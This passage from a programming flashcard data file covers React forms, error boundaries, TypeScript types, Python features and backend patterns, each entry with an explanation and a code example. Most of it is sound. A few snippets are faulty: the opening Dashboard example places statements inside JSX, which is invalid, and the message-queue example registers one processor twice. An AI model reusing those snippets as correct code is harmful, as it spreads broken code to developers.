not handling all branches of a condition (missing loading/error states). Choose the pattern that makes the code most readable for your team and specific use case',
    example: `function Dashboard({ user, notifications, isAdmin }) {
  // && operator
  return (
    <div>
      {user && <h1>Welcome, {user.name}</h1>}

      {/* Ternary */}
      {isAdmin ? <AdminPanel /> : <UserPanel />}

      {/* Avoid: && with 0 */}
      {notifications.length > 0 && <Badge count={notifications.length} />}

      {/* Early return for loading */}
      if (!user) return <Spinner />;

      {/* Variable assignment */}
      let content;
      if (isAdmin) content = <AdminView />;
      else if (user.premium) content = <PremiumView />;
      else content = <FreeView />;

      return <div>{content}</div>;
    </div>
  );
}`
  },
  {
    title: 'Forms in React',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Controlled vs uncontrolled components and form management.',
    content: 'Controlled components: React state is the single source of truth (value + onChange). Uncontrolled components: DOM holds the state (ref). Controlled gives full control, uncontrolled is simpler for quick forms. For complex forms, consider React Hook Form or Formik.\n\nForms in React use two patterns: controlled and uncontrolled components. Controlled components use React state as the single source of truth — the input\'s value is set from state, and changes update state via onChange. This gives you complete control over the input value at all times, enabling real-time validation, formatting, and conditional behavior. Uncontrolled components let the DOM manage the input state — the initial value is set with defaultValue, and the current value is read from the DOM using a ref when needed (typically on form submission). Uncontrolled components are simpler for quick forms but less flexible for real-time validation and conditional behavior.\n\nControlled input pattern: const [email, setEmail] = useState(""); return <input value={email} onChange={(e) => setEmail(e.target.value)} />. This ensures React state always reflects the input value. You can transform input in real-time: e.target.value.toUpperCase() for uppercase, e.target.value.replace(/\\D/g, \'\') for numbers only, or e.target.value.slice(0, maxLen) for length limits. For multiple inputs, use a single state object: const [form, setForm] = useState({name: "", email: ""}); setForm({...form, [name]: value}). FormData API (new FormData(e.target)) provides a clean way to extract all form values on submission.\n\nUncontrolled input pattern: const emailRef = useRef(""); return <input ref={emailRef} defaultValue="" />. On submit: console.log(emailRef.current.value). Uncontrolled components are simpler for forms that do not need real-time validation or transformation. For complex forms with validation, dynamic fields, and complex state management, use libraries like React Hook Form (recommended — minimal re-renders, built-in validation) or Formik (mature, feature-rich). These libraries handle controlled/uncontrolled complexity, validation, error messages, and form submission. Common mistakes include: using value without onChange (creates a read-only input), using defaultValue with value (React warning), not handling form submission (e.preventDefault()), and not validating on the server (client-side validation is bypassable). Always pair client-side validation with server-side validation for security',
    example: `// Controlled component
function ControlledForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    login(email, password);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <button type="submit">Login</button>
    </form>
  );
}

// Uncontrolled with ref
function UncontrolledForm() {
  const emailRef = useRef();

  const handleSubmit = () => {
    console.log(emailRef.current.value);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input ref={emailRef} type="email" defaultValue="" />
      <button type="submit">Login</button>
    </form>
  );
}`
  },
  {
    title: 'Error Boundaries',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Catching JavaScript errors in the component tree gracefully.',
    content: 'Error boundaries are class components that catch errors in their child tree. They prevent the whole app from crashing. Use getDerivedStateFromError to update state, componentDidCatch for logging. Only class components can be error boundaries (no hook equivalent yet).\n\nError boundaries are React components that catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI instead of crashing the entire application. They are the React equivalent of try/catch blocks for component trees. Without error boundaries, a single error in a deeply nested component can crash the entire application, showing a blank screen or the error overlay. Error boundaries isolate failures to specific parts of the UI, allowing the rest of the application to continue functioning. They catch errors during rendering, lifecycle methods, and constructors of their child tree.\n\nError boundaries are class components that implement two lifecycle methods: static getDerivedStateFromError(error) — called when a child throws an error, receives the error object, and returns the new state (typically { hasError: true, error }). componentDidCatch(error, errorInfo) — called after the error has been rendered to the DOM, receives the error and component stack trace, and is used for error logging services (Sentry, LogRocket). The render method checks hasError state — if true, it renders the fallback UI; otherwise, it renders children normally. There is no hook equivalent for error boundaries yet — you must use class components.\n\nError boundaries do not catch errors in: event handlers (use try/catch inside the handler), asynchronous code (setTimeout, requestAnimationFrame), server-side rendering (SSR), or errors thrown in the error boundary itself. For event handler errors, use try/catch and update state to show error UI. For async errors, handle them in the async code. Common patterns: wrapping route-level components in error boundaries (so a page error does not crash the whole app), providing retry functionality (resetting hasError state), and logging errors to monitoring services. Common mistakes include: not implementing error boundaries (leaving the app unprotected), catching too broadly (hiding real bugs), not providing meaningful fallback UI (generic "Something went wrong" is unhelpful), and not logging errors (making debugging difficult). Place error boundaries strategically — at the route level, around complex features, and around areas with third-party components that might throw',
    example: `class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="error-fallback">
          <h2>Something went wrong</h2>
          <button onClick={() => this.setState({ hasError: false })}>
            Try again
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Usage
<ErrorBoundary>
  <Dashboard />
</ErrorBoundary>`
  },
  {
    title: 'React Patterns',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Compound components, render props, HOCs, and container/presentational.',
    content: 'Common React patterns: Compound Components (Tabs, Accordion — implicit state sharing), Render Props (pass function as child), Higher-Order Components (withAuth, withTheme — wrap components), Container/Presentational (logic vs UI separation). Modern React favors custom hooks over HOCs and render props.\n\nReact patterns are reusable solutions to common component design problems. Compound Components create implicit state sharing between related components — a parent (Tabs) manages state and provides it via context, while children (Tabs.Panel, Tabs.Tab) consume it without explicit prop passing. This creates clean, declarative APIs: <Tabs><Tabs.Panel label="A">...</Tabs.Panel><Tabs.Panel label="B">...</Tabs.Panel></Tabs>. The compound pattern keeps related components together and ensures they work correctly as a group.\n\nRender Props pass a function as a child (or prop) that receives data and returns JSX. The component calls this function with its internal state, letting the consumer decide how to render: <DataProvider render={(data) => <List items={data} />}>. This enables maximum flexibility — the data provider handles logic, the render prop handles presentation. Higher-Order Components (HOCs) wrap a component to add behavior: const withAuth = (Component) => (props) => { if (!isAuthenticated) return <Login />; return <Component {...props} />; }. HOCs add wrapper components to the tree, which can affect debugging and ref forwarding. Container/Presentational separates data fetching (container) from rendering (presentational) — containers handle state and logic, presentational components receive props and render UI.\n\nModern React favors custom hooks over HOCs and render props because they are simpler, more composable, and do not add wrapper components to the tree. Custom hooks encapsulate the same logic (data fetching, authentication, theme) without the wrapper overhead. The compound component pattern remains popular and is well-suited for design systems (Select, Menu, Accordion). Common patterns in modern React: custom hooks for logic reuse, compound components for related UI groups, and context for implicit state sharing. Common mistakes include: overusing HOCs (creates wrapper hell), using render props when custom hooks would be simpler, creating compound components that are not actually related, and not considering whether a pattern adds genuine value versus unnecessary complexity',
    example: `// Compound Components
function Tabs({ children, defaultTab }) {
  const [active, setActive] = useState(defaultTab);
  return (
    <TabsContext.Provider value={{ active, setActive }}>
      {children}
    </TabsContext.Provider>
  );
}
Tabs.Panel = ({ label, children }) => {
  const { active, setActive } = useContext(TabsContext);
  return (
    <div>
      <button onClick={() => setActive(label)}>{label}</button>
      {active === label && children}
    </div>
  );
};

// Usage
<Tabs defaultTab="Home">
  <Tabs.Panel label="Home"><HomeContent /></Tabs.Panel>
  <Tabs.Panel label="Settings"><SettingsContent /></Tabs.Panel>
</Tabs>

// Custom hook pattern (modern replacement for HOCs)
function useAuth() {
  const { currentUser } = useContext(AuthContext);
  return currentUser;
}`
  },
  {
    title: 'Suspense & Lazy Loading',
    category: 'React',
    subcategory: 'Advanced',
    description: 'Code splitting and loading states with React Suspense.',
    content: 'React.lazy() dynamically imports a component (code splitting). Suspense shows a fallback while loading. Together they reduce initial bundle size. Error boundaries should wrap Suspense for error handling. Suspense also works with data fetching (React 18+)',
    example: `import { lazy, Suspense } from 'react';

// Lazy load heavy components
const Analytics = lazy(() => import('./pages/Analytics'));
const CodeLab = lazy(() => import('./pages/CodeLab'));

function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route path="/analytics" element={<Analytics />} />
        <Route path="/codelab" element={<CodeLab />} />
      </Routes>
    </Suspense>
  );
}

// With error boundary
<ErrorBoundary>
  <Suspense fallback={<Spinner />}>
    <HeavyComponent />
  </Suspense>
</ErrorBoundary>

// Named exports with lazy
const Dashboard = lazy(() =>
  import('./Dashboard').then(mod => ({ default: mod.Dashboard }))
);`
  },
  {
    title: 'React Hooks Rules',
    category: 'React',
    subcategory: 'Best Practices',
    description: 'Rules that must be followed for hooks to work correctly.',
    content: 'Two rules: (1) Only call hooks at the top level — never inside loops, conditions, or nested functions. (2) Only call hooks from React functions — components or custom hooks. These rules exist because hooks rely on call order to match state to hooks. The eslint-plugin-react-hooks enforces these',
    example: `// ❌ WRONG — conditional hook
function Component({ show }) {
  if (show) {
    const [value, setValue] = useState('');  // ERROR!
  }
}

// ✅ RIGHT — always call hooks
function Component({ show }) {
  const [value, setValue] = useState('');
  // Use the value conditionally in JSX
  return show && <input value={value} />;
}

// ❌ WRONG — hook in callback
function Component() {
  useEffect(() => {
    const [local, setLocal] = useState(0);  // ERROR!
  }, []);
}

// ✅ RIGHT — custom hook
function useLocalStorage(key) {
  const [value, setValue] = useState(() =>
    JSON.parse(localStorage.getItem(key))
  );
  return [value, setValue];
}

// ESLint plugin enforces rules
// npm install eslint-plugin-react-hooks`
  },

  // ═══════════════════════════════════════════
  // TYPESCRIPT — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Type System',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Static typing that catches errors at compile time, not runtime.',
    content: 'TypeScript adds a structural type system on top of JavaScript. Every variable, parameter, and return value can have a type. Types are checked at compile time and erased at runtime — no performance cost. TypeScript infers types automatically (type inference) but you can annotate explicitly. Key types: string, number, boolean, null, undefined, any, unknown, void, never, tuple, enum, union, intersection',
    example: `// Explicit annotations
let name: string = "Alice";
let age: number = 25;
let active: boolean = true;

// Type inference
let city = "NYC"; // inferred as string

// Union types
let id: string | number = "abc";
id = 123; // also valid

// Function typing
function add(a: number, b: number): number {
  return a + b;
}`
  },
  {
    title: 'Interfaces vs Types',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Two ways to define object shapes — interfaces extend, types compose.',
    content: 'Interfaces and types both define object shapes but differ in capabilities. Interfaces support declaration merging, extend other interfaces, and are ideal for object contracts and class implementations. Types support unions, intersections, mapped types, and conditional types — more flexible for complex type manipulation. Use interfaces for public APIs and object shapes; use types for unions, primitives, and computed types',
    example: `// Interface — extensible, declaration merging
interface User {
  name: string;
  age: number;
}
interface Admin extends User {
  role: string;
}

// Type — more flexible
type Point = { x: number; y: number };
type ID = string | number; // union
type Named = User & { email: string }; // intersection

// Declaration merging (only interfaces)
interface Config {
  debug: boolean;
}
interface Config {
  verbose: boolean;
}
// Config now has both debug and verbose`
  },
  {
    title: 'Generics',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Type parameters that make components reusable across multiple types.',
    content: 'Generics allow you to write code that works with any type while preserving type safety. Instead of using "any", you define a type parameter (<T>) that gets resolved when the function is called. Generics are used in functions, interfaces, classes, and type aliases. Constraints (extends) limit which types can be passed. Default types provide fallback values',
    example: `// Generic function
function identity<T>(value: T): T {
  return value;
}
identity<string>("hello"); // explicitly "hello"
identity(42);               // inferred as number

// Generic interface
interface ApiResponse<T> {
  data: T;
  status: number;
}

// Constrained generic
function getProperty<T, K extends keyof T>(obj: T, key: K) {
  return obj[key];
}
const user = { name: "Alice", age: 25 };
getProperty(user, "name"); // valid
// getProperty(user, "email"); // error!`
  },
  {
    title: 'Utility Types',
    category: 'TypeScript',
    subcategory: 'Fundamentals',
    description: 'Built-in type transformations for common patterns.',
    content: 'TypeScript provides utility types that transform existing types. Partial<T> makes all properties optional. Required<T> makes all properties required. Pick<T, K> selects specific keys. Omit<T, K> removes specific keys. Record<K, V> creates typed objects. Readonly<T> prevents mutation. ReturnType<T> extracts function return types. Parameters<T> extracts parameter types',
    example: `interface User {
  name: string;
  age: number;
  email: string;
}

// Partial — all optional
type UpdateUser = Partial<User>;

// Pick — select keys
type UserName = Pick<User, "name">;

// Omit — remove keys
type UserWithoutEmail = Omit<User, "email">;

// Record — typed object
type Roles = Record<string, string[]>;

// Readonly — immutable
const user: Readonly<User> = { name: "A", age: 25, email: "a@b.com" };
// user.name = "B"; // error!`
  },
  {
    title: 'Decorators',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: 'Functions that modify classes, methods, properties, or parameters at declaration time.',
    content: 'Decorators are special declarations that can be attached to class declarations, methods, properties, or parameters. They execute when the class is defined, not instantiated. Enable experimentalDecorators in tsconfig. Use cases: logging, memoization, validation, dependency injection, and AOP (aspect-oriented programming). Class decorators receive the constructor. Method decorators receive prototype, key, and descriptor',
    example: `// Method decorator — logging
function Log(target: any, key: string, descriptor: PropertyDescriptor) {
  const original = descriptor.value;
  descriptor.value = function (...args: any[]) {
    console.log(\`Calling \${key} with\`, args);
    return original.apply(this, args);
  };
}

class Calculator {
  @Log
  add(a: number, b: number) {
    return a + b;
  }
}

new Calculator().add(2, 3);
// logs: Calling add with [2, 3]`
  },
  {
    title: 'Type Narrowing',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: 'Refining broad types to more specific ones through control flow analysis.',
    content: 'TypeScript automatically narrows types within conditionals, type guards, and assertions. You can narrow using typeof, instanceof, in operator, custom type guards (x is Type), and discriminated unions (switch on a common literal property). Narrowing lets you safely access properties that only exist on specific types',
    example: `// Discriminated union
type Shape =
  | { kind: "circle"; radius: number }
  | { kind: "rectangle"; width: number; height: number };

function area(shape: Shape): number {
  switch (shape.kind) {
    case "circle":
      return Math.PI * shape.radius ** 2; // narrowed
    case "rectangle":
      return shape.width * shape.height;   // narrowed
  }
}

// typeof narrowing
function format(value: string | number) {
  if (typeof value === "string") {
    return value.toUpperCase(); // narrowed to string
  }
  return value.toFixed(2);      // narrowed to number
}`
  },
  {
    title: 'Mapped Types',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: 'Creating new types by transforming each property of an existing type.',
    content: 'Mapped types iterate over keys of an existing type to produce a new type. Syntax: { [K in keyof T]: NewType }. Combined with modifiers, you can add/remove readonly and optional. Template literal types enable string manipulation. Mapped types power most utility types and enable powerful type-level programming',
    example: `// Basic mapped type
type Optional<T> = {
  [K in keyof T]?: T[K];
};

// Make all properties readonly
type Immutable<T> = {
  readonly [K in keyof T]: T[K];
};

// Remove nullability
type NonNullable<T> = {
  [K in keyof T]: Exclude<T[K], null>;
};

interface User { name: string; age: number; }
type OptionalUser = Optional<User>;
// { name?: string; age?: number; }

// With template literals
type Getters<T> = {
  [K in keyof T as \`get\${Capitalize<string & K>}\`]: () => T[K];
};`
  },
  {
    title: 'Declaration Files',
    category: 'TypeScript',
    subcategory: 'Advanced',
    description: '.d.ts files that provide type information for JavaScript libraries.',
    content: 'Declaration files (.d.ts) describe the shape of JavaScript modules that lack TypeScript types. They use "declare" to describe runtime values without implementing them. DefinitelyTyped (@types/*) is the community repository for type definitions. You can generate .d.ts from your own code with "declaration: true" in tsconfig. Module augmentation extends existing type definitions',
    example: `// my-library.d.ts
declare module "my-library" {
  export function doSomething(input: string): number;
  export interface Config {
    debug: boolean;
    timeout?: number;
  }
}

// Ambient declarations
declare const API_URL: string;
declare function fetchJSON<T>(url: string): Promise<T>;

// Module augmentation
declare module "express" {
  interface Request {
    user?: { id: string; role: string };
  }
}`
  },

  // ═══════════════════════════════════════════
  // PYTHON — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Variables & Types',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Dynamic typing with built-in types and type hinting.',
    content: 'Python is dynamically typed — no type declarations needed. Variables are names bound to objects. Built-in types: int, float, str, bool, list, tuple, dict, set, None. Type hints (PEP 484) add optional annotations for documentation and tooling. Python uses duck typing — if it quacks like a duck, it\'s a duck. Multiple assignment and tuple unpacking are idiomatic',
    example: `# Multiple assignment
x, y, z = 1, 2.5, "hello"
a = b = c = 0

# Type hints (not enforced at runtime)
name: str = "Alice"
age: int = 25
scores: list[float] = [95.5, 87.3]

# Tuple unpacking
point = (3, 4)
px, py = point

# Walrus operator (Python 3.8+)
if (n := len([1, 2, 3])) > 2:
    print(f"Length is {n}")`
  },
  {
    title: 'List Comprehensions',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Concise syntax for creating lists from iterables with optional filtering.',
    content: 'List comprehensions replace for-loops for list creation. Syntax: [expr for item in iterable if condition]. They\'re faster than equivalent for-loops because the iteration is optimized in C. You can nest comprehensions and use them for dicts ({k:v}) and sets. Keep them simple — if they\'re complex, use a regular loop',
    example: `# Basic
squares = [x**2 for x in range(10)]

# With condition
evens = [x for x in range(20) if x % 2 == 0]

# Nested
matrix = [[i*j for j in range(3)] for i in range(3)]

# Dict comprehension
word_lengths = {w: len(w) for w in ["hello", "world"]}

# Set comprehension
unique_chars = {c for c in "mississippi"}

# Generator expression (memory efficient)
total = sum(x**2 for x in range(1000000))`
  },
  {
    title: 'Decorators',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Functions that modify other functions or classes — a form of metaprogramming.',
    content: 'A decorator is a function that takes a function and returns a modified version. The @decorator syntax is syntactic sugar for func = decorator(func). Decorators are used for logging, authentication, caching, rate limiting, and more. They can take arguments using nested functions. Class decorators modify classes. functools.wraps preserves the original function\'s metadata',
    example: `import functools
import time

def timer(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        print(f"{func.__name__} took {time.time()-start:.4f}s")
        return result
    return wrapper

@timer
def slow_function():
    time.sleep(1)
    return "done"

# Decorator with arguments
def retry(max_attempts=3):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise
        return wrapper
    return decorator`
  },
  {
    title: 'Generators',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Functions that yield values lazily, producing one at a time.',
    content: 'Generators use "yield" instead of "return" — they pause execution and resume on next call. They\'re memory efficient for large datasets since they produce values on-demand. Generator expressions (x**2 for x in range(1000000)) are lazy lists. send() and yield from provide advanced control flow. Generators implement the iterator protocol (__iter__, __next__)',
    example: `# Generator function
def fibonacci():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

fib = fibonacci()
print(next(fib))  # 0
print(next(fib))  # 1
print(next(fib))  # 1

# Yield from — delegating to sub-generator
def flatten(nested):
    for item in nested:
        if isinstance(item, list):
            yield from flatten(item)
        else:
            yield item

list(flatten([1, [2, 3], [4, [5]]]))  # [1,2,3,4,5]

# Generator expression
total = sum(x**2 for x in range(1000000))`
  },
  {
    title: 'Context Managers',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Objects that manage resource allocation and cleanup with the "with" statement.',
    content: 'Context managers ensure proper resource handling (files, connections, locks) by pairing setup and teardown. The "with" statement calls __enter__ on entry and __exit__ on exit, even if exceptions occur. Implement via class (__enter__/__exit__) or @contextmanager decorator. They prevent resource leaks and reduce boilerplate try/finally blocks',
    example: `from contextlib import contextmanager

# File context manager
with open("data.txt", "r") as f:
    content = f.read()
# File automatically closed

# Custom context manager with decorator
@contextmanager
def database_connection(url):
    conn = connect(url)
    try:
        yield conn
    finally:
        conn.close()

with database_connection("postgres://...") as db:
    db.execute("SELECT 1")

# Suppress exceptions
from contextlib import suppress
with suppress(FileNotFoundError):
    os.remove("maybe_exists.txt")`
  },
  {
    title: 'Object-Oriented Programming',
    category: 'Python',
    subcategory: 'Fundamentals',
    description: 'Classes, inheritance, and Python\'s data model.',
    content: 'Python supports multiple inheritance, method resolution order (MRO), and dunder methods for operator overloading. Classes are first-class objects. Use @property for getters/setters, @classmethod for alternative constructors, @staticmethod for utility methods. Dataclasses (@dataclass) auto-generate __init__, __repr__, __eq__, etc. Python uses "composition over inheritance" as a guiding principle',
    example: `from dataclasses import dataclass

@dataclass
class Point:
    x: float
    y: float

    def distance(self, other: "Point") -> float:
        return ((self.x - other.x)**2 + (self.y - other.y)**2)**0.5

class Animal:
    def __init__(self, name: str):
        self.name = name

    def speak(self) -> str:
        raise NotImplementedError

class Dog(Animal):
    def speak(self) -> str:
        return f"{self.name} says Woof!"

# Property decorator
class Circle:
    def __init__(self, radius: float):
        self._radius = radius

    @property
    def area(self) -> float:
        return 3.14159 * self._radius ** 2`
  },
  {
    title: 'Type Hints',
    category: 'Python',
    subcategory: 'Advanced',
    description: 'Optional annotations for static type checking and better IDE support.',
    content: 'Type hints (PEP 484) add type information without runtime enforcement. They improve code documentation, enable static analysis with mypy/pyright, and provide better IDE autocompletion. Use typing module for complex types: List, Dict, Optional, Union, Callable, TypeVar, Generic, Protocol, Literal, Annotated. Type hints are optional but increasingly standard in production Python',
    example: `from typing import Optional, Union, Callable, TypeVar, Generic

T = TypeVar("T")

# Basic hints
def greet(name: str) -> str:
    return f"Hello, {name}"

# Optional and Union
def find_user(id: int) -> Optional[dict]:
    return None  # could be dict or None

# Generic class
class Stack(Generic[T]):
    def __init__(self) -> None:
        self._items: list[T] = []

    def push(self, item: T) -> None:
        self._items.append(item)

    def pop(self) -> T:
        return self._items.pop()

# Protocol (structural subtyping)
from typing import Protocol

class Drawable(Protocol):
    def draw(self) -> None: ...`
  },
  {
    title: 'Async Programming',
    category: 'Python',
    subcategory: 'Advanced',
    description: 'Cooperative concurrency using asyncio for I/O-bound tasks.',
    content: 'Python\'s asyncio provides single-threaded concurrency using an event loop. async/await syntax makes asynchronous code readable. Use for I/O-bound tasks (network, files, databases), not CPU-bound work. asyncio.gather() runs multiple coroutines concurrently. aiohttp, asyncpg, aioredis provide async libraries. asyncio.Semaphore controls concurrency limits',
    example: `import asyncio
import aiohttp

async def fetch(session, url):
    async with session.get(url) as response:
        return await response.text()

async def main():
    urls = ["https://api.example.com/1", "https://api.example.com/2"]

    async with aiohttp.ClientSession() as session:
        # Run concurrently
        tasks = [fetch(session, url) for url in urls]
        results = await asyncio.gather(*tasks)

    for result in results:
        print(result)

# Semaphore for rate limiting
sem = asyncio.Semaphore(10)

async def limited_fetch(session, url):
    async with sem:
        return await fetch(session, url)

asyncio.run(main())`
  },

  // ═══════════════════════════════════════════
  // BACKEND — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'REST API Design',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'Architectural constraints for building scalable web services.',
    content: 'REST (Representational State Transfer) uses HTTP methods semantically: GET (read), POST (create), PUT (full update), PATCH (partial update), DELETE (remove). Resources are nouns at plural URLs (/users, /users/123). Use HTTP status codes correctly: 200 (OK), 201 (Created), 204 (No Content), 400 (Bad Request), 401 (Unauthorized), 404 (Not Found), 500 (Server Error). Stateless — each request contains all needed info',
    example: `// Resource-oriented URLs
GET    /api/v1/users          # List users
POST   /api/v1/users          # Create user
GET    /api/v1/users/:id      # Get user
PATCH  /api/v1/users/:id      # Update user
DELETE /api/v1/users/:id      # Delete user

// Status codes
200 OK — successful GET
201 Created — successful POST
400 Bad Request — validation error
401 Unauthorized — missing/invalid token
404 Not Found — resource doesn't exist

// Pagination
GET /api/v1/users?page=2&limit=20

// Filtering
GET /api/v1/users?role=admin&status=active`
  },
  {
    title: 'JWT Authentication',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'JSON Web Tokens for stateless API authentication.',
    content: 'JWT (JSON Web Tokens) encode user claims in a signed token. Three parts: header (algorithm), payload (claims), signature (verification). Server validates tokens without database lookup — making auth stateless. Store in httpOnly cookies (not localStorage). Tokens have expiration (exp claim). Use refresh tokens for long-lived sessions. Never store sensitive data in the payload (it\'s base64, not encrypted)',
    example: `// JWT structure: header.payload.signature

// Creating a token (server-side)
const jwt = require("jsonwebtoken");

const token = jwt.sign(
  { userId: 123, role: "admin" },
  process.env.JWT_SECRET,
  { expiresIn: "1h" }
);

// Verifying (middleware)
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "No token" });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
}`
  },
  {
    title: 'Middleware Pattern',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'Functions that process requests in a pipeline before reaching the handler.',
    content: 'Middleware functions execute sequentially in a chain. Each middleware can modify the request/response, end the cycle, or pass control to the next middleware. Used for logging, authentication, CORS, body parsing, validation, error handling. Express, Fastify, and Koa all use this pattern. Middleware order matters — auth before route handlers, logging first',
    example: `// Express middleware pipeline
const express = require("express");
const app = express();

// 1. Logging (first)
app.use((req, res, next) => {
  console.log(\`\${req.method} \${req.path}\`);
  next();
});

// 2. Auth middleware
function auth(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).send("Unauthorized");
  req.user = verifyToken(token);
  next();
}

// 3. Route with auth
app.get("/profile", auth, (req, res) => {
  res.json(req.user);
});

// Error handler (last)
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message });
});`
  },
  {
    title: 'Database Connection Pooling',
    category: 'Backend',
    subcategory: 'Fundamentals',
    description: 'Reusing database connections to avoid overhead of constant connection creation.',
    content: 'Creating a new database connection for each request is expensive (TCP handshake, auth). Connection pooling maintains a pool of open connections that are reused. Configured with min/max connections, idle timeout, and connection lifetime. Libraries: pg-pool (PostgreSQL), mysql2 pools, Prisma, SQLAlchemy. Monitor pool usage — exhaustion causes request queuing and timeouts',
    example: `// PostgreSQL connection pool
const { Pool } = require("pg");

const pool = new Pool({
  host: "localhost",
  port: 5432,
  database: "myapp",
  user: "admin",
  password: "secret",
  max: 20,           // max connections
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

// Use pool
async function query(text, params) {
  const client = await pool.connect();
  try {
    const result = await client.query(text, params);
    return result.rows;
  } finally {
    client.release(); // return to pool
  }
}

// Cleanup on shutdown
process.on("SIGTERM", () => pool.end());`
  },
  {
    title: 'Caching Strategies',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Storing frequently accessed data closer to the application.',
    content: 'Caching reduces database load and response times. Strategies: Cache-aside (app checks cache first, then DB), Write-through (write to cache+DB simultaneously), Write-behind (write to cache, async to DB), Read-through (cache loads from DB on miss). Invalidation is the hardest problem — use TTL (time-to-live), event-based invalidation, or versioned keys. Redis is the most common cache store',
    example: `// Cache-aside pattern
async function getUser(id) {
  // 1. Check cache
  const cached = await redis.get(\`user:\${id}\`);
  if (cached) return JSON.parse(cached);

  // 2. Cache miss — fetch from DB
  const user = await db.query("SELECT * FROM users WHERE id = $1", [id]);
  if (!user) return null;

  // 3. Populate cache with TTL
  await redis.setex(\`user:\${id}\`, 3600, JSON.stringify(user));
  return user;
}

// Cache invalidation on write
async function updateUser(id, data) {
  await db.query("UPDATE users SET ... WHERE id = $1", [id]);
  await redis.del(\`user:\${id}\`); // invalidate
}`
  },
  {
    title: 'Message Queues',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Asynchronous communication between services via pub/sub or task queues.',
    content: 'Message queues decouple services, enabling asynchronous processing. Producers publish messages; consumers process them. Use cases: background jobs (emails, reports), event-driven architectures, load leveling, fan-out. RabbitMQ (traditional), Kafka (event streaming), Redis Streams, Amazon SQS. Patterns: pub/sub, task queues, competing consumers, dead letter queues for failed messages',
    example: `// Bull queue (Redis-based)
const Queue = require("bull");
const emailQueue = new Queue("email");

// Producer — add job
await emailQueue.add("welcome", {
  userId: 123,
  email: "user@example.com"
});

// Consumer — process jobs
emailQueue.process("welcome", async (job) => {
  const { userId, email } = job.data;
  await sendWelcomeEmail(email);
  console.log(\`Email sent to \${email}\`);
});

// Retry failed jobs
emailQueue.process("welcome", { attempts: 3 }, async (job) => {
  try {
    await sendEmail(job.data.email);
  } catch (err) {
    console.error("Failed:", err.message);
    throw err; // Bull will retry
  }
});`
  },
  {
    title: 'API Rate Limiting',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Controlling request frequency to protect services and ensure fair usage.',
    content: 'Rate limiting restricts how many requests a client can make in a time window. Strategies: Fixed window (resets at interval), Sliding window (rolling), Token bucket (allows bursts), Leaky bucket (constant rate). Implement with Redis (atomic counters), nginx (limit_req), or API gateways. Return 429 Too Many Requests with Retry-After header. Apply per-user, per-IP, or per-API-key',
    example: `// Redis-based sliding window rate limiter
async function rateLimit(key, limit, windowMs) {
  const now = Date.now();
  const windowStart = now - windowMs;

  const pipe = redis.pipeline();
  pipe.zremrangebyscore(key, 0, windowStart); // remove old
  pipe.zadd(key, now, now);                   // add current
  pipe.zcard(key);                            // count
  pipe.pexpire(key, windowMs);                // set expiry

  const results = await pipe.exec();
  const count = results[2][1];

  return {
    allowed: count <= limit,
    remaining: Math.max(0, limit - count),
    resetAt: new Date(now + windowMs)
  };
}

// Express middleware
app.use("/api", async (req, res, next) => {
  const result = await rateLimit(req.ip, 100, 60000);
  res.set("X-RateLimit-Remaining", result.remaining);
  if (!result.allowed) return res.status(429).json({ error: "Too many requests" });
  next();
});`
  },
  {
    title: 'Graceful Shutdown',
    category: 'Backend',
    subcategory: 'Architecture',
    description: 'Handling server shutdown cleanly — finishing in-flight requests and releasing resources.',
    content: 'When deploying or scaling, servers receive SIGTERM. Graceful shutdown: stop accepting new connections, finish in-flight requests, close database pools, flush caches, close message consumers. Set a timeout (e.g., 30s) then force exit. Prevents data loss, dropped connections, and incomplete transactions. Essential for zero-downtime deployments with Kubernetes or Docker',
